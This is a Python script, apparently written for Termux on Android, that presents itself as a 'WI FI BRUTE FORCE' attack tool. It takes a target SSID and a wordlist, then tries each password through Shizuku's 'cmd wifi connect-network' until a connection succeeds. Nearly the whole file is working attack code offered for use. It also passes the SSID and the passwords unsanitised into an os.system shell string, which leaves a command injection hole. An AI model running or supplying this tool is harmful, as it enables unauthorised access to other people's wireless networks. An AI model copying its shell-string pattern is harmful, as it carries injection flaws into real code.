import os
import time
import subprocess

# ANSI Color Codes for Terminal Output
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'
BOLD = '\033[1m'

def banner():
    # Header: Uppercase, Red, and Bold
    print(f"{RED}{BOLD}" + "="*40)
    print("        WI FI BRUTE FORCE")
    print("="*40 + f"{RESET}")
    
    # Credit Line: Green and centered
    print(f"      {GREEN}A Attack Tool By Bayazid Habib{RESET}\n")

def get_wordlist_path():
    # Triggers Android File Picker using Termux API
    print("[+] Opening File Picker to select wordlist...")
    try:
        # Executes termux-storage-get to let user select a file
        subprocess.check_call(['termux-storage-get', 'tmp_wordlist.txt'])
        return 'tmp_wordlist.txt'
    except Exception as e:
        print(f"{RED}[- ] Error accessing file picker: {e}{RESET}")
        return None

def attack():
    banner()
    
    # Command Authentication
    while True:
        cmd_input = input(f"{BOLD}Type 'attack' to start the process: {RESET}").lower()
        if cmd_input == "attack":
            break
        else:
            print(f"{RED}[!] Invalid command. Access denied.{RESET}")

    ssid = input("[+] Target WiFi SSID: ")
    wordlist_path = get_wordlist_path()

    if not wordlist_path or not os.path.exists(wordlist_path):
        print(f"{RED}[-] Wordlist selection failed or file missing!{RESET}")
        return

    # Execution Loop
    try:
        with open(wordlist_path, 'r') as f:
            lines = f.readlines()
            total_pass = len(lines)
            
            for index, line in enumerate(lines, 1):
                password = line.strip()
                
                # Android WPA2 requires minimum 8 characters
                if len(password) < 8:
                    continue
                
                # Real-time Status Update
                print(f"[*] Testing [{index}/{total_pass}]: {password}", end='\r')
                
                # System Injection via Shizuku (rish)
                # This uses cmd wifi service for low CPU overhead
                command = f'./rish -c "cmd wifi connect-network {ssid} wpa2 {password}"'
                status = os.system(command)
                
                # Check for successful connection (Exit code 0)
                if status == 0:
                    print(f"\n\n{GREEN}{BOLD}[+] SUCCESS!{RESET}")
                    print(f"{GREEN}[*] Found Password: {password}{RESET}")
                    print(f"{GREEN}[*] Attempt Number: {index}{RESET}")
                    return

                # Efficiency delay to prevent system lag
                time.sleep(2) 
                
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Process terminated by user.{RESET}")
    finally:
        # Cleanup temporary file if exists
        if os.path.exists('tmp_wordlist.txt'):
            os.remove('tmp_wordlist.txt')

if __name__ == "__main__":
    attack()
